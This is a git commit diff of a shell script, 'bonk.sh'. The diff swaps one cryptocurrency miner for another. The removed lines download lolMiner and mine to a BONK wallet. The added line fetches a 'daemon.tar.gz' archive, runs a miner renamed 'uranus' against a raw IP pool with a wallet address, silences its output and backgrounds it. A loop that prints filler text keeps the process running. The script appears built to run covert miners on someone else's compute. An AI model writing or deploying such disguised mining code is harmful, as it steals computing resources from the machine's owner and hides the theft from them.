5787ffb8702af888f711c51cf996fede8c149284
preak07 <160253225+preak07@users.noreply.github.com>
2024-02-22 16:52:39 +0700

    Update bonk.sh

--- bonk.sh
+++ bonk.sh
@@ -1,11 +1,6 @@
-#!/bin/bash
-set -x
-apt-get update
-apt-get install -y curl wget
-mkdir .lolMiner && cd .lolMiner
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz && tar -xvf lolMiner_v1.84_Lin64.tar.gz && cd 1.84 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN.vivo >/dev/null 2>&1 &
+wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "vivo1" -t 2 > /dev/null 2>&1 &
 while true
 do
-        echo "My Work"
+        echo "gasss........!"
         sleep 20
 done
